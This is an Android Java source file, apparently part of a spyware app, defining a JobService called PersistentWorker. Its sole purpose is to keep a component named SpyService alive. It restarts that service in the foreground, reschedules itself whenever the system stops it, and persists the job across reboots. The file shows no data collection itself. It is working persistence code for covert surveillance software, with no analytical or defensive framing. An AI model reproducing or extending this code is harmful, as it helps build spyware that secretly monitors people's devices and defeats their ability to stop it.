package com.nullx.pp;

import android.app.job.JobInfo;
import android.app.job.JobParameters;
import android.app.job.JobScheduler;
import android.app.job.JobService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

public class PersistentWorker extends JobService {
    private static final int JOB_ID = 1001;
    private static final String TAG = "CRPT.PersistentWorker";

    @Override
    public boolean onStartJob(JobParameters params) {
        // Re-schedule SpyService to keep it alive
        try {
            Intent svc = new Intent(this, SpyService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
            else startService(svc);
        } catch (Exception e) {
            Log.w(TAG, "onStartJob startService failed: " + e.getMessage());
        }
        return false;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        // Reschedule
        try {
            schedule(this);
        } catch (Exception e) {
            Log.w(TAG, "onStopJob reschedule failed: " + e.getMessage());
        }
        return true;
    }

    public static void schedule(Context context) {
        try {
            JobScheduler scheduler = (JobScheduler) context.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (scheduler != null) {
                ComponentName componentName = new ComponentName(context, PersistentWorker.class);
                JobInfo.Builder builder = new JobInfo.Builder(JOB_ID, componentName);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    builder.setMinimumLatency(60000);
                    builder.setOverrideDeadline(120000);
                    builder.setRequiresDeviceIdle(false);
                    builder.setPersisted(true);
                } else {
                    builder.setPeriodic(60000);
                }
                scheduler.schedule(builder.build());
            }
        } catch (Exception e) {
            Log.e(TAG, "schedule failed: " + e.getMessage());
        }
    }
}
